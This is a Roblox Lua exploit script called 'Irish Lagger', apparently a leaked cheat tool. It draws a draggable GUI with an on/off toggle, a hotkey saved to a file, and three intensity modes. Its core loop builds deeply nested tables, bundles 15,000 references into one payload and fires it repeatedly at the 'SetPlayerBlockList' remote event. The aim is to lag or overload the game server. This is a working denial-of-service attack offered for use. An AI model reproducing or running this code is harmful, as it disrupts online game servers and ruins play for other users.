print("leaked by wiskas at angelz")

local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local plrGui = plr:WaitForChild("PlayerGui")
local cfg = {
    x = 2.5,
    y = 1,
    z = 0.15
}
local remoteStuff = "RobloxReplicatedStorage.SetPlayerBlockList"
local textThing, frameThing, btnThing, statusThing
local active = false
local hotkey = nil
local screenThing = Instance.new("ScreenGui")
screenThing.Name = "IrishLaggerGui"
screenThing.ResetOnSpawn = false
screenThing.Parent = plrGui
for _,kid in pairs(plrGui:GetChildren()) do
    if kid.Name == "IrishLaggerGui" and kid ~= screenThing then
        kid:Destroy()
    end
end

frameThing = Instance.new("Frame")
frameThing.Name = "MainFrame"
frameThing.Size = UDim2.new(0, 245, 0, 116)
frameThing.Position = UDim2.new(0.5, -122.5, 0.5, -58)
frameThing.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
frameThing.BackgroundTransparency = 1
frameThing.BorderSizePixel = 0
frameThing.Active = true
frameThing.Draggable = true
frameThing.ClipsDescendants = true
frameThing.Parent = screenThing

-- Background Image
local backgroundImage = Instance.new("ImageLabel")
backgroundImage.Name = "BackgroundImage"
backgroundImage.Size = UDim2.new(1, 0, 1, 0)
backgroundImage.Position = UDim2.new(0, 0, 0, 0)
backgroundImage.BackgroundTransparency = 1
backgroundImage.Image = "rbxassetid://96891397688508"
backgroundImage.ImageTransparency = 0
backgroundImage.ScaleType = Enum.ScaleType.Crop
backgroundImage.ZIndex = 1
backgroundImage.Parent = frameThing

local imageCorner = Instance.new("UICorner")
imageCorner.CornerRadius = UDim.new(0, 10)
imageCorner.Parent = backgroundImage

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frameThing

local borderThing = Instance.new("UIStroke")
borderThing.Color = Color3.fromRGB(0, 0, 0)
borderThing.Thickness = 2
borderThing.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
borderThing.Parent = frameThing

local topBar = Instance.new("Frame")
topBar.Name = "TitleBar"
topBar.Size = UDim2.new(1, 0, 0, 28)
topBar.BackgroundTransparency = 1
topBar.ZIndex = 5
topBar.Parent = frameThing

local titleText = Instance.new("TextLabel")
titleText.Size = UDim2.new(0.6, 0, 1, 0)
titleText.Position = UDim2.new(0, 10, 0, 0)
titleText.BackgroundTransparency = 1
titleText.Text = "Irish Lagger"
titleText.TextColor3 = Color3.fromRGB(255, 255, 255)
titleText.TextSize = 11
titleText.Font = Enum.Font.GothamBold
titleText.TextXAlignment = Enum.TextXAlignment.Left
titleText.ZIndex = 6
titleText.Parent = topBar

statusThing = Instance.new("TextLabel")
statusThing.Size = UDim2.new(0.4, 0, 1, 0)
statusThing.Position = UDim2.new(0.6, 0, 0, 0)
statusThing.BackgroundTransparency = 1
statusThing.Text = "OFF"
statusThing.TextColor3 = Color3.fromRGB(255, 100, 100)
statusThing.TextSize = 9
statusThing.Font = Enum.Font.GothamBold
statusThing.TextXAlignment = Enum.TextXAlignment.Right
statusThing.ZIndex = 6
statusThing.Parent = topBar

local line = Instance.new("Frame")
line.Size = UDim2.new(1, -16, 0, 1)
line.Position = UDim2.new(0, 8, 0, 28)
line.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
line.BackgroundTransparency = 0.3
line.BorderSizePixel = 0
line.ZIndex = 5
line.Parent = frameThing

-- Main Toggle Button
btnThing = Instance.new("TextButton")
btnThing.Size = UDim2.new(1, -16, 0, 30)
btnThing.Position = UDim2.new(0, 8, 0, 34)
btnThing.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
btnThing.BackgroundTransparency = 0.65
btnThing.BorderSizePixel = 0
btnThing.AutoButtonColor = false
btnThing.Text = ""
btnThing.ZIndex = 5
btnThing.Parent = frameThing

local btnCorner = Instance.new("UICorner")
btnCorner.CornerRadius = UDim.new(0, 8)
btnCorner.Parent = btnThing

local btnBorder = Instance.new("UIStroke")
btnBorder.Color = Color3.fromRGB(0, 0, 0)
btnBorder.Thickness = 1
btnBorder.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
btnBorder.Parent = btnThing

-- Keybind Button
local keyBtn = Instance.new("TextButton")
keyBtn.Size = UDim2.new(0, 25, 0, 25)
keyBtn.Position = UDim2.new(0, 5, 0.5, -12.5)
keyBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
keyBtn.BackgroundTransparency = 1
keyBtn.Text = "V"
keyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
keyBtn.Font = Enum.Font.GothamBold
keyBtn.TextSize = 12
keyBtn.BorderSizePixel = 0
keyBtn.ZIndex = 7
keyBtn.Parent = btnThing

local keyCorner = Instance.new("UICorner")
keyCorner.CornerRadius = UDim.new(0, 10)
keyCorner.Parent = keyBtn

local keyBorder = Instance.new("UIStroke")
keyBorder.Color = Color3.fromRGB(255, 255, 255)
keyBorder.Thickness = 1
keyBorder.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
keyBorder.Parent = keyBtn

textThing = Instance.new("TextLabel")
textThing.Size = UDim2.new(0.55, 0, 1, 0)
textThing.Position = UDim2.new(0, 37, 0, 0)
textThing.BackgroundTransparency = 1
textThing.Text = "Lagger"
textThing.TextColor3 = Color3.fromRGB(255, 255, 255)
textThing.Font = Enum.Font.GothamBold
textThing.TextSize = 10
textThing.TextXAlignment = Enum.TextXAlignment.Left
textThing.ZIndex = 7
textThing.Parent = btnThing

-- Low / Mid / High Buttons
local modes = {"Low", "Mid", "High"}
local modeButtons = {}
local modeFrame = Instance.new("Frame")
modeFrame.Size = UDim2.new(1, -16, 0, 24)
modeFrame.Position = UDim2.new(0, 8, 0, 70)
modeFrame.BackgroundTransparency = 1
modeFrame.ZIndex = 5
modeFrame.Parent = frameThing

for i, modeName in ipairs(modes) do
    local modeBtn = Instance.new("TextButton")
    modeBtn.Size = UDim2.new(0.327, 0, 1, 0)
    modeBtn.Position = UDim2.new((i-1) * 0.34, 0, 0, 0)
    modeBtn.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
    modeBtn.BackgroundTransparency = 0.68
    modeBtn.Text = modeName
    modeBtn.TextColor3 = Color3.fromRGB(30, 30, 30)  -- Black text
    modeBtn.Font = Enum.Font.GothamBold
    modeBtn.TextSize = 10
    modeBtn.BorderSizePixel = 0
    modeBtn.ZIndex = 6
    modeBtn.Parent = modeFrame

    local mCorner = Instance.new("UICorner")
    mCorner.CornerRadius = UDim.new(0, 5)
    mCorner.Parent = modeBtn

    local mStroke = Instance.new("UIStroke")
    mStroke.Color = Color3.fromRGB(0, 0, 0)
    mStroke.Thickness = 1.5
    mStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    mStroke.Parent = modeBtn

    modeBtn.MouseButton1Click:Connect(function()
        for _, btn in ipairs(modeButtons) do
            btn.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
            btn.TextColor3 = Color3.fromRGB(30, 30, 30)  -- Keep text black
            local stroke = btn:FindFirstChildOfClass("UIStroke")
            if stroke then stroke.Color = Color3.fromRGB(0, 0, 0) end
        end
        
        -- Only outline changes to white
        local selectedStroke = modeBtn:FindFirstChildOfClass("UIStroke")
        if selectedStroke then selectedStroke.Color = Color3.fromRGB(255, 255, 255) end
        -- Text stays black
        modeBtn.TextColor3 = Color3.fromRGB(30, 30, 30)

        if modeName == "Low" then
            cfg.x, cfg.y, cfg.z = 1.5, 1, 0.25
        elseif modeName == "Mid" then
            cfg.x, cfg.y, cfg.z = 2.5, 1, 0.15
        elseif modeName == "High" then
            cfg.x, cfg.y, cfg.z = 4, 2, 0.08
        end
    end)

    table.insert(modeButtons, modeBtn)
end

-- Default to Mid (white outline only)
local defaultStroke = modeButtons[2]:FindFirstChildOfClass("UIStroke")
if defaultStroke then defaultStroke.Color = Color3.fromRGB(255, 255, 255) end
modeButtons[2].TextColor3 = Color3.fromRGB(30, 30, 30)

local saveLoc = "IrishLagger_Keybind.txt"
function grabKey()
    local worked, data = pcall(readfile, saveLoc)
    if worked and data and data ~= "" then
        for _, code in pairs(Enum.KeyCode:GetEnumItems()) do
            if code.Name == data then
                hotkey = code
                keyBtn.Text = code.Name:sub(1,1)
                break
            end
        end
    end
    if not hotkey then
        keyBtn.Text = "V"
    end
end
function storeKey(key)
    hotkey = key
    keyBtn.Text = key.Name:sub(1,1)
    pcall(writefile, saveLoc, key.Name)
end
grabKey()

function getRemote(road)
    if not road or road == "" then return nil end
    local obj = game
    local clean = road:gsub("^game%.", "")
    for piece in clean:gmatch("[^%.]+") do
        if obj then obj = obj[piece] else return nil end
    end
    return obj
end

function doSpam(inc, attempts)
    local mainTable = {}
    local spamTable = {}
    table.insert(spamTable, {})
    local ptr = spamTable[1]
    for i = 1, inc do
        local newTable = {}
        table.insert(ptr, newTable)
        ptr = newTable
    end
    for i = 1, 15000 do
        table.insert(mainTable, spamTable)
        if i % 1000 == 0 then task.wait() end
    end
    local remoteObj = getRemote(remoteStuff)
    if remoteObj then
        for i = 1, attempts do
            pcall(function()
                if remoteObj:IsA("RemoteEvent") or remoteObj:IsA("UnreliableRemoteEvent") then
                    remoteObj:FireServer(mainTable)
                elseif remoteObj:IsA("RemoteFunction") then
                    remoteObj:InvokeServer(mainTable)
                end
            end)
        end
    end
end

function runLoop()
    while active do
        task.spawn(function() doSpam(cfg.x, cfg.y) end)
        task.wait(cfg.z)
    end
end

function flip(state)
    active = state
    if active then
        btnThing.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        btnBorder.Color = Color3.fromRGB(0, 0, 0)
        statusThing.Text = "ON"
        statusThing.TextColor3 = Color3.fromRGB(100, 255, 100)
        task.spawn(runLoop)
    else
        btnThing.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
        btnBorder.Color = Color3.fromRGB(0, 0, 0)
        statusThing.Text = "OFF"
        statusThing.TextColor3 = Color3.fromRGB(255, 100, 100)
    end
end

btnThing.MouseButton1Click:Connect(function()
    flip(not active)
end)

local waiting = false
keyBtn.MouseButton1Click:Connect(function()
    waiting = true
    keyBtn.Text = "..."
end)

UserInputService.InputBegan:Connect(function(input, processedInput)
    if processedInput then return end
    if input.KeyCode == Enum.KeyCode.LeftControl then
        frameThing.Visible = not frameThing.Visible
        return
    end
    if waiting and input.UserInputType == Enum.UserInputType.Keyboard then
        storeKey(input.KeyCode)
        waiting = false
    elseif hotkey and input.KeyCode == hotkey then
        flip(not active)
    end
end)

local closeBtn = Instance.new("TextButton")
closeBtn.Visible = false
closeBtn.Parent = topBar
closeBtn.MouseButton1Click:Connect(function()
    screenThing:Destroy()
end)

local minimized = false
local miniBtn = Instance.new("TextButton")
miniBtn.Visible = false
miniBtn.Parent = topBar
miniBtn.MouseButton1Click:Connect(function()
    minimized = not minimized
    btnThing.Visible = not minimized
    modeFrame.Visible = not minimized
    if minimized then
        frameThing:TweenSize(UDim2.new(0, 240, 0, 60), "Out", "Quad", 0.2, true)
    else
        frameThing:TweenSize(UDim2.new(0, 245, 0, 116), "Out", "Quad", 0.2, true)
    end
end)